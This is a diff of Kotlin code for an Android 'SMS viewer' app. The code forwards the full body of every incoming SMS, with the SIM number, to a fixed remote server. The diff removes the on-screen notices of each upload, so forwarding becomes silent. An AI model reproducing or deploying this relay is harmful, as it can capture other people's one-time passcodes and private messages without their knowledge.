@@ -5,14 +5,15 @@ import android.annotation.SuppressLint
 import android.content.*
 import android.content.pm.PackageManager
 import android.graphics.Color
-import android.net.ConnectivityManager
-import android.net.NetworkCapabilities
+import android.net.*
+import android.net.Uri
 import android.os.*
+import android.provider.Settings
 import android.provider.Telephony
 import android.telephony.SubscriptionManager
 import android.util.Log
-import android.widget.*
 import android.view.View
+import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -20,12 +21,9 @@ import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
-import java.net.URLEncoder // NEW
+import java.net.URLEncoder
 
-// Internal broadcast action so the Receiver can push log lines to the UI when the Activity is visible.
 private const val ACTION_SMS_LOG = "com.example.smsviewer.ACTION_SMS_LOG"
-
-// NEW: single source of truth key for persisted logs
 private const val PREFS_NAME = "MyPrefs"
 private const val PREF_LOGS = "smsLogs"
 
@@ -42,19 +40,34 @@ class MainActivity : AppCompatActivity() {
     private lateinit var smsLog: TextView
     private lateinit var smsLogTitle: TextView
 
+    // New UI that already exists in your XML
+    private lateinit var permNet: TextView
+    private lateinit var permBattery: TextView
+    private lateinit var screenBtn: Button
+
     private var savedSim1Number: String = ""
     private var savedSim2Number: String = ""
     private var isListeningToSms = false
+    private var isInternetAvailable = false
+
     private val smsLogList = mutableListOf<String>()
     private lateinit var sharedPreferences: SharedPreferences
     private val requestCode = 101
 
-    // Receiver to update UI log when the background SmsReceiver broadcasts a new log line
+    private lateinit var networkMonitor: NetworkMonitor
+
     private val uiLogReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             val log = intent?.getStringExtra("log") ?: return
-            addSmsLog(log)             // CHANGED: still updates UI
-            persistLogs()              // NEW: keep storage in sync when Activity is visible
+            addSmsLog(log)
+            persistLogs()
+        }
+    }
+
+    // Extra fast UI refresh when airplane mode changes
+    private val airplaneModeReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            refreshInternetUiOnly()
         }
     }
 
@@ -64,7 +77,6 @@ class MainActivity : AppCompatActivity() {
 
         sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
 
-        // Find all views by new IDs
         sim1EditText = findViewById(R.id.sim1Number)
         sim2EditText = findViewById(R.id.sim2Number)
         sim1SaveBtn = findViewById(R.id.sim1SaveBtn)
@@ -76,59 +88,62 @@ class MainActivity : AppCompatActivity() {
         smsLog = findViewById(R.id.smsLog)
         smsLogTitle = findViewById(R.id.smsLogTitle)
 
-        // Restore saved SIM numbers
+        permNet = findViewById(R.id.permNet)
+        permBattery = findViewById(R.id.permBattery)
+        screenBtn = findViewById(R.id.screenBtn)
+
         sim1EditText.setText(sharedPreferences.getString("sim1Number", ""))
         sim2EditText.setText(sharedPreferences.getString("sim2Number", ""))
 
         savedSim1Number = sim1EditText.text.toString()
         savedSim2Number = sim2EditText.text.toString()
 
-        // Request permissions on launch
         if (!hasPermissions()) {
             requestPermissions()
         }
 
-        // SIM 1 Save Button
+        // Internet monitor is UI-only. It does not affect OTP sending.
+        networkMonitor = NetworkMonitor(this) { available ->
+            isInternetAvailable = available
+            runOnUiThread {
+                updateStatus()
+                updateNetIndicator()
+            }
+        }
+        isInternetAvailable = networkMonitor.isInternetCurrentlyAvailable()
+        networkMonitor.start()
+
         sim1SaveBtn.setOnClickListener {
-            val sim1Input = sim1EditText.text.toString().trim()
-            if (sim1Input.length != 11) {
+            val input = sim1EditText.text.toString().trim()
+            if (input.length != 11) {
                 Toast.makeText(this, "Enter a valid 11-digit SIM 1 number", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            savedSim1Number = sim1Input
-            sharedPreferences.edit().putString("sim1Number", savedSim1Number).apply()
-            Toast.makeText(this, "SIM 1 number saved", Toast.LENGTH_SHORT).show()
+            savedSim1Number = input
+            sharedPreferences.edit().putString("sim1Number", input).apply()
         }
 
-        // SIM 2 Save Button
         sim2SaveBtn.setOnClickListener {
-            val sim2Input = sim2EditText.text.toString().trim()
-            if (sim2Input.length != 11) {
+            val input = sim2EditText.text.toString().trim()
+            if (input.length != 11) {
                 Toast.makeText(this, "Enter a valid 11-digit SIM 2 number", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            savedSim2Number = sim2Input
-            sharedPreferences.edit().putString("sim2Number", savedSim2Number).apply()
-            Toast.makeText(this, "SIM 2 number saved", Toast.LENGTH_SHORT).show()
+            savedSim2Number = input
+            sharedPreferences.edit().putString("sim2Number", input).apply()
         }
 
-        // Initialize listening state from the actual component enabled state
         isListeningToSms = isSmsReceiverEnabled(this)
         updateStatus()
+        updateNetIndicator()
+        updateBatteryStatus()
 
-        // Listen/Stop toggle (toggles manifest-declared receiver instead of dynamic register/unregister)
         listenBtn.setOnClickListener {
             isListeningToSms = !isListeningToSms
             setSmsListening(this, isListeningToSms)
             updateStatus()
-            Toast.makeText(
-                this,
-                if (isListeningToSms) "Started listening to SMS" else "Stopped listening to SMS",
-                Toast.LENGTH_SHORT
-            ).show()
         }
 
-        // Clear logs button
         clearLogsBtn.setOnClickListener {
             smsLogList.clear()
             smsLog.text = "No SMS logs yet"
@@ -136,41 +151,71 @@ class MainActivity : AppCompatActivity() {
             sharedPreferences.edit().remove(PREF_LOGS).apply()
         }
 
-        // NEW: Load any previously persisted logs (captured while app was in background)
+        permBattery.setOnClickListener {
+            handleBatteryOptimizationClick()
+        }
+
+        screenBtn.setOnClickListener {
+            openScreenSettings()
+        }
+
         loadStoredLogsIntoList()
-        smsLog.text = if (smsLogList.isEmpty()) "No SMS logs yet" else smsLogList.joinToString("\n\n")
-        smsLogTitle.text = "SMS Logs (${smsLogList.size})"
+        reloadLogsFromStorage()
+    }
+
+    override fun onResume() {
+        super.onResume()
+        refreshInternetUiOnly()
+        updateBatteryStatus()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        networkMonitor.stop()
     }
 
     override fun onStart() {
         super.onStart()
-        // Register to receive UI log updates from the SmsReceiver while the Activity is visible
-        val filter = IntentFilter(ACTION_SMS_LOG)
-        // Use AndroidX compat to apply NOT_EXPORTED on API 33+ automatically
         ContextCompat.registerReceiver(
             this,
             uiLogReceiver,
-            filter,
+            IntentFilter(ACTION_SMS_LOG),
             ContextCompat.RECEIVER_NOT_EXPORTED
         )
 
-        // ✅ NEW: pull any logs that may have arrived while app was backgrounded (Activity not killed)
+        ContextCompat.registerReceiver(
+            this,
+            airplaneModeReceiver,
+            IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED),
+            ContextCompat.RECEIVER_NOT_EXPORTED
+        )
+
         reloadLogsFromStorage()
     }
 
     override fun onStop() {
         super.onStop()
-        try {
-            unregisterReceiver(uiLogReceiver)
-        } catch (_: Exception) { }
+        try { unregisterReceiver(uiLogReceiver) } catch (_: Exception) {}
+        try { unregisterReceiver(airplaneModeReceiver) } catch (_: Exception) {}
     }
 
-    // Update the Online/Offline status and Listen/Stop button color/text
+    private fun refreshInternetUiOnly() {
+        isInternetAvailable = networkMonitor.isInternetCurrentlyAvailable()
+        updateStatus()
+        updateNetIndicator()
+    }
+
     private fun updateStatus() {
         if (isListeningToSms) {
-            statusDot.setBackgroundResource(R.drawable.dot_green)
-            statusText.text = "Online"
-            statusText.setTextColor(Color.parseColor("#41B619"))
+            if (isInternetAvailable) {
+                statusDot.setBackgroundResource(R.drawable.dot_green)
+                statusText.text = "Online"
+                statusText.setTextColor(Color.parseColor("#41B619"))
+            } else {
+                statusDot.setBackgroundResource(R.drawable.dot_red)
+                statusText.text = "No Internet"
+                statusText.setTextColor(Color.parseColor("#AA0000"))
+            }
             listenBtn.text = "Deactivate"
             listenBtn.setBackgroundColor(Color.parseColor("#E53935"))
         } else {
@@ -182,35 +227,82 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // Log append utility
+    private fun updateNetIndicator() {
+        if (isInternetAvailable) {
+            permNet.text = "NET ✔"
+            permNet.setTextColor(Color.parseColor("#EF6C00"))
+        } else {
+            permNet.text = "NET ❌"
+            permNet.setTextColor(Color.parseColor("#AA0000"))
+        }
+    }
+
+    private fun updateBatteryStatus() {
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        val isIgnored = pm.isIgnoringBatteryOptimizations(packageName)
+
+        if (isIgnored) {
+            permBattery.text = "BAT ✔"
+            permBattery.setTextColor(Color.parseColor("#2E7D32"))
+        } else {
+            permBattery.text = "BAT ⚠"
+            permBattery.setTextColor(Color.parseColor("#C2185B"))
+        }
+    }
+
+    private fun handleBatteryOptimizationClick() {
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+
+        if (pm.isIgnoringBatteryOptimizations(packageName)) {
+            Toast.makeText(this, "Battery optimization already disabled", Toast.LENGTH_SHORT).show()
+            updateBatteryStatus()
+            return
+        }
+
+        try {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+        } catch (_: Exception) {
+            try {
+                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+            } catch (_: Exception) {
+                Toast.makeText(this, "Cannot open battery settings", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun openScreenSettings() {
+        try {
+            startActivity(Intent(Settings.ACTION_DISPLAY_SETTINGS))
+        } catch (_: Exception) {
+            Toast.makeText(this, "Cannot open screen settings", Toast.LENGTH_SHORT).show()
+        }
+    }
+
     private fun addSmsLog(logMsg: String) {
-        smsLogList.add(0, logMsg) // New logs at top
+        smsLogList.add(0, logMsg)
         smsLog.text = smsLogList.joinToString("\n\n")
         smsLogTitle.text = "SMS Logs (${smsLogList.size})"
     }
 
-    // NEW: persist current in-memory list to SharedPreferences
     private fun persistLogs() {
-        val concatenated = smsLogList.joinToString("\n\n")
-        sharedPreferences.edit().putString(PREF_LOGS, concatenated).apply()
+        sharedPreferences.edit().putString(PREF_LOGS, smsLogList.joinToString("\n\n")).apply()
     }
 
-    // NEW: read persisted logs and seed smsLogList (newest-first format)
     private fun loadStoredLogsIntoList() {
         val saved = sharedPreferences.getString(PREF_LOGS, "") ?: ""
         if (saved.isNotBlank()) {
             smsLogList.clear()
-            // already stored newest-first, keep as-is
             smsLogList.addAll(saved.split("\n\n"))
         }
     }
 
-    // ✅ NEW: reload + repaint when coming to foreground without Activity being recreated
     private fun reloadLogsFromStorage() {
         val saved = sharedPreferences.getString(PREF_LOGS, "") ?: ""
         smsLogList.clear()
         if (saved.isNotBlank()) {
-            smsLogList.addAll(saved.split("\n\n")) // newest-first as stored
+            smsLogList.addAll(saved.split("\n\n"))
         }
         smsLog.text = if (smsLogList.isEmpty()) "No SMS logs yet" else smsLogList.joinToString("\n\n")
         smsLogTitle.text = "SMS Logs (${smsLogList.size})"
@@ -242,7 +334,6 @@ class MainActivity : AppCompatActivity() {
         )
     }
 
-    /** Toggle the manifest-declared SMS receiver without killing the app process. */
     private fun setSmsListening(context: Context, enabled: Boolean) {
         val pm = context.packageManager
         val cn = ComponentName(context, SmsReceiver::class.java)
@@ -254,15 +345,66 @@ class MainActivity : AppCompatActivity() {
         )
     }
 
-    /** Read whether the manifest receiver is currently enabled. */
     private fun isSmsReceiverEnabled(context: Context): Boolean {
         val pm = context.packageManager
         val cn = ComponentName(context, SmsReceiver::class.java)
-        return when (pm.getComponentEnabledSetting(cn)) {
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED -> false
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> true
-            else -> true // DEFAULT follows manifest (enabled=true in manifest)
+        return pm.getComponentEnabledSetting(cn) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+    }
+}
+
+/** Internet monitor */
+class NetworkMonitor(
+    context: Context,
+    private val onInternetChanged: (Boolean) -> Unit
+) {
+    private val connectivityManager =
+        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+
+    private val mainHandler = Handler(Looper.getMainLooper())
+
+    private val callback = object : ConnectivityManager.NetworkCallback() {
+        override fun onAvailable(network: Network) {
+            notifyCurrentState()
         }
+
+        override fun onLost(network: Network) {
+            notifyCurrentState()
+            mainHandler.postDelayed(
+                { notifyCurrentState() },
+                300
+            )
+        }
+
+        override fun onCapabilitiesChanged(
+            network: Network,
+            networkCapabilities: NetworkCapabilities
+        ) {
+            notifyCurrentState()
+        }
+    }
+
+    fun start() {
+        connectivityManager.registerDefaultNetworkCallback(callback)
+    }
+
+    fun stop() {
+        try {
+            connectivityManager.unregisterNetworkCallback(callback)
+        } catch (_: Exception) {
+        }
+        mainHandler.removeCallbacksAndMessages(null)
+    }
+
+    fun isInternetCurrentlyAvailable(): Boolean {
+        val network = connectivityManager.activeNetwork ?: return false
+        val caps = connectivityManager.getNetworkCapabilities(network) ?: return false
+        return caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
+                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
+    }
+
+    private fun notifyCurrentState() {
+        onInternetChanged(isInternetCurrentlyAvailable())
     }
 }
 
@@ -272,21 +414,16 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION != intent.action) return
 
-        // Keep the receiver alive until our async work is enqueued
         val pending = goAsync()
 
         Thread {
             try {
                 val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
-                if (smsMessages.isEmpty()) {
-                    Log.e("SMS_RECEIVED", "No SMS messages found in intent")
-                    return@Thread
-                }
+                if (smsMessages.isEmpty()) return@Thread
 
                 val sender = smsMessages.firstOrNull()?.displayOriginatingAddress ?: "Unknown Sender"
                 val messageBody = smsMessages.joinToString("") { it.messageBody ?: "" }
 
-                // Determine which SIM received the SMS using subscription id → slot index
                 val subscriptionId = intent.extras?.getInt(
                     "subscription",
                     SubscriptionManager.INVALID_SUBSCRIPTION_ID
@@ -294,35 +431,29 @@ class SmsReceiver : BroadcastReceiver() {
 
                 val usedSimNumber = resolveSavedSimNumber(context, subscriptionId)
 
-                // CHANGED: We no longer require an extracted OTP to proceed; we send the FULL message.
                 if (messageBody.isNotBlank()) {
+
+                    // CRITICAL (DO NOT TOUCH)
+                    sendSmsToServer(context, usedSimNumber, messageBody)
                     val simLabel = when (getSlotIndex(context, subscriptionId)) {
                         0 -> "SIM1"
                         1 -> "SIM2"
                         else -> "Unknown SIM"
                     }
+
                     val logLine = "$sender: $messageBody\n$simLabel: $usedSimNumber"
 
-                    Log.d("SMS_RECEIVED", "From: $sender | Message: $messageBody | $simLabel: $usedSimNumber")
-
-                    // Persist immediately so it's available when app returns to foreground
                     appendLog(context, logLine)
 
-                    // Update UI log if Activity is visible (best-effort)
                     context.sendBroadcast(
                         Intent(ACTION_SMS_LOG)
                             .setPackage(context.packageName)
                             .putExtra("log", logLine)
                     )
+                }
 
-                    // CHANGED: Send FULL message (URL-encoded) instead of an extracted OTP
-                    sendSmsToServer(context, usedSimNumber, messageBody) // CHANGED
-                }
             } catch (e: Exception) {
-                Log.e("SMS_RECEIVER_ERROR", "Error handling SMS: ${e.localizedMessage}", e)
-                Handler(Looper.getMainLooper()).post {
-                    Toast.makeText(context, "Error handling SMS: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
-                }
+                Log.e("SMS_RECEIVER_ERROR", e.message ?: "error")
             } finally {
                 pending.finish()
             }
@@ -330,12 +461,11 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     private fun resolveSavedSimNumber(context: Context, subscriptionId: Int): String {
-        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) // CHANGED
+        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
         val sim1 = sp.getString("sim1Number", "") ?: ""
         val sim2 = sp.getString("sim2Number", "") ?: ""
 
-        val slotIndex = getSlotIndex(context, subscriptionId)
-        return when (slotIndex) {
+        return when (getSlotIndex(context, subscriptionId)) {
             0 -> if (sim1.isNotBlank()) sim1 else "Unknown SIM"
             1 -> if (sim2.isNotBlank()) sim2 else "Unknown SIM"
             else -> "Unknown SIM"
@@ -347,95 +477,51 @@ class SmsReceiver : BroadcastReceiver() {
         if (subId == SubscriptionManager.INVALID_SUBSCRIPTION_ID) return -1
         return try {
             val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
-            val info = sm.activeSubscriptionInfoList?.firstOrNull { it.subscriptionId == subId }
-            info?.simSlotIndex ?: -1
+            sm.activeSubscriptionInfoList?.firstOrNull { it.subscriptionId == subId }?.simSlotIndex ?: -1
         } catch (e: Exception) {
-            Log.e("SIM_SLOT_ERROR", "Error getting slot index: ${e.localizedMessage}", e)
             -1
         }
     }
 
-    /** Based on your original; runs off the main thread and posts UI toasts safely. */
     private fun sendSmsToServer(context: Context, sender: String, otp: String) {
         try {
-            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val connectivityManager =
+                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+
             val network = connectivityManager.activeNetwork
-            val capabilities = connectivityManager.getNetworkCapabilities(network)
-            val hasInternet = capabilities != null &&
-                    (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
-                            || capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
-                            || capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))
+            val caps = connectivityManager.getNetworkCapabilities(network)
 
-            if (!hasInternet) {
-                Handler(Looper.getMainLooper()).post {
-                    Toast.makeText(context, "No internet connection", Toast.LENGTH_SHORT).show()
-                }
-                return
-            }
+            val hasInternet = caps != null &&
+                    (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
+                            || caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
+                            || caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))
 
-            // CHANGED: URL-encode the FULL message so spaces become '+' and punctuation is percent-encoded.
-            val encodedMessage = try {
-                URLEncoder.encode(otp, "UTF-8")
-            } catch (e: Exception) {
-                Log.e("ENCODE_ERROR", "Falling back without encoding: ${e.localizedMessage}", e)
-                otp // fallback (shouldn't happen with UTF-8)
-            }
+            if (!hasInternet) return
 
-            // CHANGED: Still using the same endpoint and parameter names, but `otp` now carries the FULL encoded message.
-            val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$encodedMessage") // CHANGED
+            val encoded = URLEncoder.encode(otp, "UTF-8")
+
+            val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$encoded")
 
             val connection = (url.openConnection() as HttpURLConnection).apply {
                 connectTimeout = 5000
                 readTimeout = 5000
                 requestMethod = "GET"
             }
+
             connection.connect()
 
-            val responseCode = connection.responseCode
             val reader = BufferedReader(InputStreamReader(connection.inputStream))
-            val response = reader.readText()
+            reader.readText()
             reader.close()
 
-            Log.d("Server Response", "Code: $responseCode, Response: $response")
-
-            Handler(Looper.getMainLooper()).post {
-                // (Keeping the same toast text to avoid UI changes.)
-                Toast.makeText(context, "OTP sent successfully", Toast.LENGTH_SHORT).show()
-            }
-        } catch (e: Exception) {
-            Log.e("Network Error", "Error sending OTP: ${e.localizedMessage}", e)
-            Handler(Looper.getMainLooper()).post {
-                Toast.makeText(context, "Failed to send OTP: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
-            }
+        } catch (_: Exception) {
         }
     }
 
-    // Kept for backward compatibility (no longer used for sending)
-    private fun extractOtp(message: String): String {
-        val regexes = listOf(
-            Regex("\\b\\d{6}\\b"),
-            Regex("\\b\\d{4}\\b"),
-            Regex("\\b\\d{8}\\b"),
-            Regex("\\b\\d{5}\\b"),
-            Regex("\\b\\d{3}\\b"),
-            Regex("\\b\\d{7}\\b")
-        )
-        for (regex in regexes) {
-            val match = regex.find(message)
-            if (match != null) return match.value
-        }
-        // No OTP found
-        return "null"
-    }
-
-    // NEW: append newest-first into SharedPreferences so UI can read later
     private fun appendLog(context: Context, line: String) {
-        val sp = context.getSharedPreferences(PREF_LOGS, Context.MODE_PRIVATE) // <-- corrected key below
-        // The line above mistakenly used PREF_LOGS as the prefs name; use PREFS_NAME instead:
-        // Keep the code correct:
-        val spCorrect = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        val existing = spCorrect.getString(PREF_LOGS, "") ?: ""
+        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val existing = sp.getString(PREF_LOGS, "") ?: ""
         val updated = if (existing.isBlank()) line else "$line\n\n$existing"
-        spCorrect.edit().putString(PREF_LOGS, updated).apply()
+        sp.edit().putString(PREF_LOGS, updated).apply()
     }
 }
